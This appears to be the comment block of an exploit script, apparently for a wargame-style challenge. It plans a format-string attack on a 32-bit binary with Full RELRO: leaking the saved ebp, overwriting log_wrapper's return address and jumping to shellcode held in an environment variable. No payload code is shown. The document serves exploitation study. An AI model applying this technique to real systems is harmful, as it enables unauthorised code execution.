# Useful observations looking at the disassembled code:
#
#   - The target buffer is on the stack at the moment of the vulnerability, this means that
#   we can copy the address we want to overwrite into the target buffer.
#   - Full RELRO is on so we can't play with GOT/PLT or .dtor section (but there is an interesting
#   address on the stack that we can play with)
#   - There is a string with "/bin/sh" at 0xb7f83a24 (checked with peda)

# We have some constraints here. Full RELRO is preventing us from overwriting GOT/PLT or .dtor section.
# That means that there are no nice static addresses we can target, we have to look at some address on
# the stack that could lead us to the control of the eip.
# Another important limitation is that our buffer is never stored in a local variable, so it's location
# is going to be a pain to predict (since it changes depending on the length of the program name, length
# of the string, environment variables...)

# Let's start by storing our shellcode in an environment variable, this script will assemble it and
# print it in a format we can use lateri (recicled from the previous exploit).

# we need to know is a valid address where we can overwrite with our shell pointer

# There is a nice place on the stack where we can place our new pointer and gain
# control of the eip. This is the position of the return address [ebp+4] in log_wrapper

# This is a little bit trickier to do since addresses of the stack shift depending
# on various things such as the env vars, program name, argument lengths...

# The nice thing about format strings is that they allow us to leak stack contents
# we just need to know if there is a stack address stored somewhere in the stack.

# Seems that there is a candidate, the old ebp! stored right after the return address.
# We can make use of the format sring bug to read this address.

# Let's build a dummy string with the same length as our exploit string and use %08x to
# read the wanted address. [ebp+0x4] is at [esp+0x13c] offset 79 from esp, but snprintf
# takes three arguments so the correct offset will be 76.
